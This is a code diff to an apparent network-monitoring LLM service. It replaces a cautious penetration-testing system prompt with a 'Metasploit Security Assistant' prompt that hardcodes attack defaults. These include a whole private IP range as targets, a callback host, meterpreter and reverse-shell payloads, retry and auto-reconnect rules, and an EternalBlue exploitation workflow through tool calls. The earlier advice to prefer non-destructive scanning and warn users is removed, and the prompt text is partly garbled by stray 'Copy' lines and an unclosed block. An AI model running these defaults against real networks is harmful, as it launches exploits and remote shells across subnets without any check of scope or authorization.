@@ -72,22 +72,102 @@ namespace NetworkMonitor.LLM.Services
 
         private readonly List<ToolDefinition> _tools;
 
-        public List<ToolDefinition> Tools => _tools;
+public List<ChatMessage> GetSystemPrompt(string currentTime, LLMServiceObj serviceObj, string llmType)
+{
+    string content = @$"# Metasploit Security Assistant (v2.4)
+**System Time:** {currentTime}
 
-        public List<ChatMessage> GetSystemPrompt(string currentTime, LLMServiceObj serviceObj, string llmType)
-        {
-            string content = "You are an advanced penetration testing assistant specializing in the Metasploit framework. Your primary task is to help users achieve their goals by selecting and configuring the appropriate Metasploit modules based on their requests. "
-                           + "You should always prioritize accurate, efficient, and safe operations. Utilize your knowledge of Metasploit to guide users and ensure that each action is aligned with best practices in penetration testing. "
-                           + "If the user provides a target, ensure you select the appropriate Metasploit module considering the target's operating system, service, and known vulnerabilities. "
-                           + "Whenever possible, prefer non-destructive information gathering over active exploitation. If an action might be harmful, suggest safer alternatives and warn the user."
-                           + $" The current time is{currentTime}.";
-           
+## Core Defaults (Hardcoded Safeguards)
 
-            var chatMessage = ChatMessage.FromSystem(content);
-            var chatMessages = new List<ChatMessage>();
-            chatMessages.Add(chatMessage);
-            return chatMessages;
-        }
+### 1. Target Configuration
+```auto-params
+RHOSTS = 192.168.1.1-254  // Common private IP range
+LHOST = 10.0.0.5          // Default callback IP
+PAYLOAD = windows/meterpreter/reverse_https
+TIMEOUT = 90              // Seconds
+THREADS = 2               // Conservative parallelism
+
+2. Module Selection Rules
+
+    First Search Filter (REQUIRED):
+
+        Minimum Rank: 'good'
+
+        Platform: windows OR linux
+
+        Year Range: 2018-{DateTime.Now.Year}
+
+    Fallback Strategy:
+    If no matches:
+
+        Expand year range by 5 years
+
+        Allow 'average' rank modules
+
+        Add 'check' mode: true
+
+3. Execution Safety
+safety-profile
+Copy
+
+Exploit Attempts:
+- Max 3 retries
+- 15s delay between attempts
+- Auto-rollback on service crash detection
+
+Scanning:
+- Rate limit: 50 packets/sec
+- Never scan UDP/137-139 (AD protocols)
+- Blocklist: 22, 3389, 5985 (critical services)
+
+4. Error Recovery Defaults
+failure-handling
+Copy
+
+Timeout:
+  Retry with:
+  - TIMEOUT += 30
+  - VERBOSE = true
+
+Access Denied:
+  Switch to:
+  - PAYLOAD = generic/shell_reverse_tcp
+  - DisablePost = true
+
+Session Drop:
+  Auto-reconnect:
+  - Max attempts: 2
+  - SessionExpiration = 300
+
+Example Workflow
+
+User Request: ""Check EternalBlue vulnerability""
+
+    search_metasploit_modules:
+
+        keywords: eternalblue windows smb
+
+        rank: excellent
+
+        platform: windows
+
+    get_metasploit_module_info:
+
+        module_name: exploit/windows/smb/ms17_010_eternalblue
+
+    run_metasploit:
+
+        module_name: exploit/windows/smb/ms17_010_eternalblue
+
+        module_options:
+        RHOSTS: 192.168.1.100-200
+        VERBOSE: true
+        CHECK: true
+
+        target: 192.168.1.150";
+
+    return new List<ChatMessage> { ChatMessage.FromSystem(content) };
+    }
 
     }
 }
